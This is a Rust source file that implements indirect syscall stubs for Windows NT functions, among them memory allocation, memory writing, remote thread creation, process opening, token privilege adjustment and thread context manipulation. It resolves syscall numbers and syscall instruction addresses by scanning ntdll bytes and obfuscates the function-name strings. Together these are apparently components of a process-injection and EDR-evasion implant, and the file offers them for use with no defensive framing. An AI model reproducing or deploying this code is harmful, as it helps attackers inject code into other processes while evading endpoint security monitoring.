use std::arch::naked_asm;
use std::ffi::c_void;

use ntapi::ntapi_base::CLIENT_ID;
use winapi::um::winnt::{HANDLE, CONTEXT, TOKEN_INFORMATION_CLASS, TOKEN_PRIVILEGES};
use winapi::shared::ntdef::OBJECT_ATTRIBUTES;
use obfuse::obfuse;
use anyhow::anyhow;

use crate::parse_pe::{PeModuleParser, get_module_handle};

use crate::{debug_eprintln, debug_println};

#[repr(C)]
#[derive(Copy, Clone, Debug)]
pub struct NtSsn {
    pub ssn: u32,
    pub syscall_ret: *mut u8,
}

impl Default for NtSsn {
    fn default() -> Self {
        Self { ssn: 0, syscall_ret: std::ptr::null_mut() }
    }
}

#[repr(usize)]
pub enum NtIndex {
    ZwAllocateVirtualMemory = 0,
    ZwProtectVirtualMemory = 1,
    ZwFlushInstructionCache = 2,
    ZwCreateSection = 3,
    ZwMapViewOfSection = 4,
    ZwUnmapViewOfSection = 5,
    ZwQuerySystemInformation = 6,
    ZwQueryObject = 7,
    ZwQueryVirtualMemory = 8,
    ZwFreeVirtualMemory = 9,
    ZwSetContextThread = 10,
    ZwGetContextThread = 11,
    ZwWriteVirtualMemory = 12,
    ZwCreateThreadEx = 13,
    ZwOpenProcess = 14,
    NtOpenProcessToken = 15,
    NtQueryInformationToken = 16,
    NtAdjustPrivilegesToken = 17,
    NtDuplicateObject = 18
}

const NT_FUNCTION_COUNT: usize = 19;

// ═══════════════════════════════════════════════════
// NtAllocateVirtualMemory (ZwAllocateVirtualMemory)
// ═══════════════════════════════════════════════════
#[unsafe(naked)]
#[unsafe(no_mangle)]
pub unsafe extern "win64" fn zw_allocate_virtual_memory(
    process_handle:  HANDLE,
    base_address:    *mut *mut c_void,
    zero_bits:       u64,
    region_size:     *mut usize,
    allocation_type: u64,
    protect:         u64,
    ssn:             u32,
    syscall_ret:     *mut u8,
) -> i32 {
    naked_asm!(
        "mov r10, rcx",
        "mov eax, dword ptr [rsp + 56]",
        "jmp qword ptr [rsp + 64]"
    )
}

// ═══════════════════════════════════════════════════
// NtOpenProcess (ZwOpenProcess)
// ═══════════════════════════════════════════════════
#[unsafe(naked)]
#[unsafe(no_mangle)]
pub unsafe extern "win64" fn zw_open_process(
    process_handle:     *mut HANDLE,
    desired_access:     u32,
    object_attributes:  *mut OBJECT_ATTRIBUTES,
    client_id:          *mut CLIENT_ID,
    ssn:                u32,
    syscall_ret:        *mut u8,
) -> i32 {
    naked_asm!(
        "mov r10, rcx",
        "mov eax, dword ptr [rsp + 40]",
        "jmp qword ptr [rsp + 48]"
    )
}

// ═══════════════════════════════════════════════════
// NtCreateThreadEx (ZwCreateThreadEx)
// ═══════════════════════════════════════════════════
#[unsafe(naked)]
#[unsafe(no_mangle)]
pub unsafe extern "win64" fn zw_create_thread_ex(
    thread_handle:      *mut HANDLE,
    desired_access:     u32,
    object_attributes:  *mut OBJECT_ATTRIBUTES,
    process_handle:     HANDLE,
    start_routine:      *mut c_void,
    argument:           *mut c_void,
    create_flags:       u64,
    zero_bits:          usize,
    stack_size:         usize,
    max_stack_size:     usize,
    attribute_list:     *mut c_void,
    ssn:                u32,
    syscall_ret:        *mut u8,
) -> i32 {
    naked_asm!(
        "mov r10, rcx",
        "mov eax, dword ptr [rsp + 96]",
        "jmp qword ptr [rsp + 104]"
    )
}

// ═══════════════════════════════════════════════════
// NtWriteVirtualMemory (ZwWriteVirtualMemory)
// ═══════════════════════════════════════════════════
#[unsafe(naked)]
#[unsafe(no_mangle)]
pub unsafe extern "win64" fn zw_write_virtual_memory(
    process_handle:         HANDLE,
    base_address:           *mut c_void,
    buffer:                 *mut c_void,
    number_of_bytes_to_write: usize,
    number_of_bytes_written: *mut usize,
    ssn:                    u32,
    syscall_ret:            *mut u8,
) -> i32 {
    naked_asm!(
        "mov r10, rcx",
        "mov eax, dword ptr [rsp + 48]",
        "jmp qword ptr [rsp + 56]"
    )
}

// ═══════════════════════════════════════════════════
// NtReadVirtualMemory (ZwReadVirtualMemory)
// ═══════════════════════════════════════════════════
#[unsafe(naked)]
#[unsafe(no_mangle)]
pub unsafe extern "win64" fn zw_read_virtual_memory(
    process_handle:         HANDLE,
    base_address:           *mut c_void,
    buffer:                 *mut c_void,
    number_of_bytes_to_read: usize,
    number_of_bytes_read: *mut usize,
    ssn:                    u32,
    syscall_ret:            *mut u8
) -> i32 {
    naked_asm!(
        "mov r10, rcx",
        "mov eax, dword ptr [rsp + 48]",
        "jmp qword ptr [rsp + 56]"
    )
}

// ═══════════════════════════════════════════════════
// NtGetContextThread (ZwGetContextThread)
// ═══════════════════════════════════════════════════
#[unsafe(naked)]
#[unsafe(no_mangle)]
pub unsafe extern "win64" fn zw_get_context_thread(
    thread_handle:  HANDLE,
    context:        *mut CONTEXT,
    ssn:            u32,
    syscall_ret:    *mut u8,
) -> i32 {
    naked_asm!(
        "mov r10, rcx",
        "mov eax, r8d",
        "jmp r9"
    )
}

// ═══════════════════════════════════════════════════
// NtSetContextThread (ZwSetContextThread)
// ═══════════════════════════════════════════════════
#[unsafe(naked)]
#[unsafe(no_mangle)]
pub unsafe extern "win64" fn zw_set_context_thread(
    thread_handle:  HANDLE,
    context:        *mut CONTEXT,
    ssn:            u32,
    syscall_ret:    *mut u8,
) -> i32 {
    naked_asm!(
        "mov r10, rcx",
        "mov eax, r8d",
        "jmp r9"
    )
}

// ═══════════════════════════════════════════════════
// NtOpenProcessToken
// ═══════════════════════════════════════════════════
#[unsafe(naked)]
#[unsafe(no_mangle)]
pub unsafe extern "win64" fn nt_open_process_token(
    process_handle: HANDLE,
    desired_access: u32,
    token_handle:   *mut HANDLE,
    ssn:            u32,
    syscall_ret:    *mut u8,
) -> i32 {
    naked_asm!(
        "mov r10, rcx",
        "mov eax, r9d",
        "jmp qword ptr [rsp + 40]"
    )
}

// ═══════════════════════════════════════════════════
// NtQueryInformationToken
// ═══════════════════════════════════════════════════
#[unsafe(naked)]
#[unsafe(no_mangle)]
pub unsafe extern "win64" fn nt_query_information_token(
    token_handle:               HANDLE,
    token_information_class:    TOKEN_INFORMATION_CLASS,
    token_information:          *mut c_void,
    token_information_length:   u64,
    return_length:              *mut u64,
    ssn:                        u32,
    syscall_ret:                *mut u8,
) -> i32 {
    naked_asm!(
        "mov r10, rcx",
        "mov eax, dword ptr [rsp + 48]",
        "jmp qword ptr [rsp + 56]"
    )
}

// ═══════════════════════════════════════════════════
// NtAdjustPrivilegesToken
// ═══════════════════════════════════════════════════
#[unsafe(naked)]
#[unsafe(no_mangle)]
pub unsafe extern "win64" fn nt_adjust_privileges_token(
    token_handle:               HANDLE,
    disable_all_privileges:     u8,                     // BOOLEAN
    new_state:                  *mut TOKEN_PRIVILEGES,
    buffer_length:              u32,
    previous_state:             *mut TOKEN_PRIVILEGES,
    return_length:              *mut u32,
    ssn:                        u32,
    syscall_addr:               *mut u8,
) -> i32 {
    naked_asm!(
        "mov r10, rcx",
        "mov eax, dword ptr [rsp + 56]",
        "jmp qword ptr [rsp + 64]"
    )
}

// ═══════════════════════════════════════════════════
// NtDuplicateObject
// ═══════════════════════════════════════════════════
#[unsafe(naked)]
#[unsafe(no_mangle)]
pub unsafe extern "win64" fn nt_duplicate_object(
    source_process_handle:      HANDLE,
    source_handle:              HANDLE,
    target_process_handle:      HANDLE,
    target_handle:              *mut HANDLE,
    desired_access:             u32,
    handle_attributes:          u64,
    options:                    u64,
    ssn:                        u32,
    syscall_addr:               *mut u8,
) -> i32 {
    naked_asm!(
        "mov r10, rcx",
        "mov eax, dword ptr [rsp + 64]",
        "jmp qword ptr [rsp + 72]"
    )
}

macro_rules! set_nt_ssn {
    ($parser:ident, $func_name:expr, $func_index:expr) => {
        unsafe {
            let Some(func_addr) = $parser.get_func_addr($func_name) else { anyhow::bail!("function not found") };
            let bytes = std::slice::from_raw_parts(func_addr as *const u8, 32);

            let mut ssn = 0;
            let mut syscall_ptr: *mut u8 = std::ptr::null_mut();
            for i in 0..bytes.len().saturating_sub(4) {
                if bytes[i] == 0xB8 && ssn == 0 {
                    ssn = u32::from_le_bytes([bytes[i + 1], bytes[i + 2], bytes[i + 3], bytes[i + 4]]);
                }
                if bytes[i] == 0x0f && bytes[i + 1] == 0x05 {
                    syscall_ptr = func_addr.add(i) ;
                    break;
                }
            }

            if ssn == 0 || syscall_ptr.is_null() {
                return Err(anyhow!("[ERROR] Failed to find ssn or syscall address for {}", $func_name));
            }

            NT_SSN[$func_index as usize] = NtSsn { ssn, syscall_ret: syscall_ptr };
        } 
    };
}


pub static mut NT_SSN: [NtSsn; NT_FUNCTION_COUNT] = [NtSsn { ssn: 0, syscall_ret: std::ptr::null_mut(), }; NT_FUNCTION_COUNT];

pub fn init_nt_api() -> Result<(), anyhow::Error>{
    let obfused_ntdll = obfuse!("ntdll.dll");
    let ntdll_str = obfused_ntdll.as_str();

    let obfused_zw_get_context_thread = obfuse!("ZwGetContextThread");
    let obfused_zw_set_context_thread = obfuse!("ZwSetContextThread");
    let obfused_nt_open_process = obfuse!("NtOpenProcess");
    let obfused_nt_allocate_virtual_memory = obfuse!("NtAllocateVirtualMemory");
    let obfused_nt_write_virtual_memory = obfuse!("NtWriteVirtualMemory");
    let obfused_nt_create_thread_ex = obfuse!("NtCreateThreadEx");
    let obfused_nt_open_process_token = obfuse!("NtOpenProcessToken");
    let obfused_nt_query_information_token = obfuse!("NtQueryInformationToken");
    let obfused_nt_adjust_privileges_token = obfuse!("NtAdjustPrivilegesToken");

    let str_nt_open_process = obfused_nt_open_process.as_str();
    let str_nt_allocate_virtual_memory = obfused_nt_allocate_virtual_memory.as_str();
    let str_nt_write_virtual_memory = obfused_nt_write_virtual_memory.as_str();
    let str_nt_create_thread_ex = obfused_nt_create_thread_ex.as_str();
    let str_zw_get_context_thread = obfused_zw_get_context_thread.as_str();
    let str_zw_set_context_thread = obfused_zw_set_context_thread.as_str();
    let str_nt_open_process_token = obfused_nt_open_process_token.as_str();
    let str_nt_query_information_token = obfused_nt_query_information_token.as_str();
    let str_nt_adjust_privileges_token = obfused_nt_adjust_privileges_token.as_str();

    let ntdll_ptr: *mut u8 = unsafe { get_module_handle(ntdll_str) };
    let parser =  PeModuleParser::new(ntdll_ptr);

    set_nt_ssn!(parser, str_nt_allocate_virtual_memory, NtIndex::ZwAllocateVirtualMemory);
    set_nt_ssn!(parser, str_nt_write_virtual_memory, NtIndex::ZwWriteVirtualMemory);
    set_nt_ssn!(parser, str_nt_open_process, NtIndex::ZwOpenProcess);
    set_nt_ssn!(parser, str_nt_create_thread_ex, NtIndex::ZwCreateThreadEx);
    set_nt_ssn!(parser, str_zw_get_context_thread, NtIndex::ZwGetContextThread);
    set_nt_ssn!(parser, str_zw_set_context_thread, NtIndex::ZwSetContextThread);
    set_nt_ssn!(parser, str_nt_open_process_token, NtIndex::NtOpenProcessToken);
    set_nt_ssn!(parser, str_nt_query_information_token, NtIndex::NtQueryInformationToken);
    set_nt_ssn!(parser, str_nt_adjust_privileges_token, NtIndex::NtAdjustPrivilegesToken);

    debug_println!("[INFO] NT API initialized successfully.");
    

    Ok(())
}